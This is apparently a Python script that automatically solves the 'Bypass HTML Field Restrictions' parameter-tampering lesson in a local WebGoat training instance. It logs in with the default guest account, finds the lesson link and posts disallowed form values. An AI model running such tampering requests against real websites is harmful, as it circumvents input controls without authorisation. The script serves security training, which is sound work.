#!/usr/bin/python

import requests
import json
import sys

s = requests.Session()

# Request to the login page to get the initial cookie
s.get("http://127.0.0.1:8080/WebGoat/login.mvc")

# POST to the login page to login and receive the proper auth cookie
loginInfo = {"username":"guest", "password":"guest"}
s.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check", data=loginInfo)

# Make a request to a random screen and menu
s.get("http://127.0.0.1:8080/WebGoat/attack?Screen=170&menu=100")

# Get the JSON string with all the menu items
menuJson = s.get("http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc")

# Turn string into python dict
d = json.loads(menuJson.text)

link = None

# Find the values for screen and manu in the JSON
for i in range(len(d)):
  if d[i]['name'] == "Parameter Tampering":
    for j in range(len(d[i]['children'])):
      if d[i]['children'][j]['name'] == "Bypass HTML Field Restrictions":
        link = d[i]['children'][j]['link']

if link == None:
  # No proper menu item found - in theory should never hit this.
  sys.exit()

submitURL = "http://127.0.0.1:8080/WebGoat/" + link
challengeParams = {"select": "baz", "radio": "baz", "checkbox": "whoops", "shortinput": "howd+that+happen", "disabledinput": "uh+oh", "SUBMIT": "Admit"}
finalResult = s.post(submitURL, data=challengeParams)

# Check to make sure that the challenge passed on the website
if "Congratulations. You have successfully completed this lesson." in finalResult.text:
  print "HTML field restrictions were successfully bypassed"
else:
  print "The HTML field restrictions could not be bypassed"
